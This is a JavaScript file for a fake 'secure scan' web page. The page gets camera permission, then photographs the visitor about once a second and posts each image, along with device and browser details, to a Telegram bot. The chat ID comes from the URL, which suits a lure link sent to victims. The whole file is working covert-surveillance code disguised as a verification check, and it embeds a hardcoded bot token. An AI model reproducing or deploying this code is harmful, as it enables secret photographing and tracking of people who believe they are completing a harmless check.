const BOT_TOKEN = "8750180526:AAFpXlIk0KHB5j3SljkE7DvheXngu7wA2Kg";

// URL example: ?=8089055081
const CHAT_ID = new URLSearchParams(window.location.search).get("=");

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const progressBar = document.getElementById("progressBar");

let interval;

window.onload = async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    video.onloadedmetadata = () => {
      startLoop();
    };
  } catch (e) {
    alert("Camera permission required ❌");
  }
};

// 🔄 loading loop (1 sec cycle)
function startLoop() {
  let progress = 0;

  if (interval) clearInterval(interval);

  interval = setInterval(() => {
    progress += 5;
    progressBar.style.width = progress + "%";

    if (progress >= 100) {
      progress = 0;
      progressBar.style.width = "0%";
      captureAndSend();
    }
  }, 50);
}

// 📸 capture image
function captureAndSend() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  ctx.filter = "brightness(1.1) contrast(1.2) saturate(1.3)";
  ctx.drawImage(video, 0, 0);

  canvas.toBlob(sendToTelegram, "image/jpeg");
}

// 📤 send to telegram
function sendToTelegram(blob) {
  const formData = new FormData();

  formData.append("chat_id", CHAT_ID);
  formData.append("photo", blob, "scan.jpg");

  const caption =
`🌍 Secure Scan Completed

🤖 Bot: @ProSimTookBot
👨‍💻 Developer: @XFPro43

📱 Device: ${navigator.platform}
🌐 Browser: ${navigator.userAgent}

🛡️ Status: VERIFIED ✅`;

  formData.append("caption", caption);

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  })
  .then(() => console.log("🔂"))
  .catch(err => console.error(err));
} 
